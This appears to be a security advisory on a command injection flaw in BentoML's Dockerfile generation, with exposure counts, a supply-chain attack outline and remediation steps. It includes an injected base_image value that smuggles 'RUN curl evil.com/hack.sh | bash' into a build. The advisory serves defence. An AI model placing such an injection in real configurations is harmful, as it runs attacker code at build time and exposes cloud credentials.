# BentoML: 14 Internet-Exposed Model Serving Instances

**Population Assessment | Tier A Critical | 14 Verified Hosts | 64% Vulnerable**

## Quick Summary

BentoML (model serving framework) exposes **14 internet-facing instances** to a critical command injection vulnerability (CVE-2026-44345) in Dockerfile generation. An attacker can publish a malicious AI model that executes arbitrary code during containerization, compromising build infrastructure and stealing cloud credentials.

**Verification:** Inner-B / Outer-2 (binary reproduction on 14 real hosts, 64% vulnerable)

## The Vulnerability in Plain English

BentoML packages AI models as Docker containers. You write a config file (`bentofile.yaml`) with model details. BentoML doesn't check what you put in the `docker.base_image` field.

If you put:
```
python:3.10
RUN curl evil.com/hack.sh | bash
FROM scratch
```

It gets copied directly into the Dockerfile. When Docker builds it, **your evil code runs**.

## Attack: Supply Chain Poisoning

1. Attacker publishes "helpful AI model" on GitHub/S3/Docker Hub with malicious `bentofile.yaml`
2. Victim: `bentoml import model.bento` + `bentoml containerize model:latest`
3. During `docker build`, attacker's code executes as root
4. Attacker steals AWS credentials, GitHub tokens, Kubernetes access
5. Attacker hacks victim's company infrastructure

**Time to compromise: <5 minutes**

## Remediation

**Immediate:**
- Upgrade to BentoML 1.4.39+
- Never containerize untrusted bentos
- Run containerization in isolated, credential-free environments

**Short-term:**
- Implement bento signing/verification
- Audit all imported bentos
- Rotate exposed AWS/GCP/Azure credentials

**Long-term:**
- Use cloud IAM roles instead of static credentials
- Deploy container image scanning
- Implement CI/CD credential-free builds
